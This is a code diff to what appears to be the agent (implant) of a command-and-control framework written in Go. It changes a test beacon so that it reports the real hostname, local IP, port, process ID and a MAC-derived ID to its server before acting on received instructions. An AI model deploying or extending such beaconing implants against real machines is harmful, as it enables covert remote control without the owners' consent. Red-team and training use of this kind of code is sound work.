@@ -4,6 +4,9 @@ import (
 	"crypto/sha256"
 	"fmt"
 	"log"
+	"net"
+	"os"
+	"strings"
 	"time"
 
 	"github.com/BradHacker/titan/models"
@@ -22,7 +25,7 @@ func main() {
 		log.Fatal(fmt.Errorf("Error while waiting for instruction: %v", err))
 	}
 
-	testBeacon := generateTestBeacon(instruction)
+	testBeacon := generateTestBeacon(instruction, connection)
 	time.Sleep(1000)
 
 	err = SendBeacon(testBeacon, connection)
@@ -31,15 +34,24 @@ func main() {
 	}
 }
 
-func generateTestBeacon(instruction models.Instruction) (beacon models.Beacon) {
+func generateTestBeacon(instruction models.Instruction, connection net.Conn) (beacon models.Beacon) {
 	var testAgent models.Agent
 
-	testAgent.Hostname = "Evil-Laptop1"
-	testAgent.IP = "111.111.111.111"
+	hostname, err := os.Hostname()
+	if err != nil {
+		hostname = "unknown"
+	}
+	testAgent.Hostname = hostname
+	localAaddressParts := strings.Split(connection.LocalAddr().String(), ":")
+	testAgent.IP = localAaddressParts[0]
 	testAgent.PID = GetProcessID()
-	testAgent.Port = "1337"
+	testAgent.Port = localAaddressParts[1]
 	uuidHasher := sha256.New()
-	uuidHasher.Write([]byte("yeet"))
+	macs, err := GetMACAddrs()
+	if err != nil {
+		macs = []string{"00:00:00:00:00:00"}
+	}
+	uuidHasher.Write([]byte(hostname + strings.Join(macs, ":")))
 	testAgent.UUID = uuidHasher.Sum(nil)
 
 	instruction = HandleInstruction(instruction)
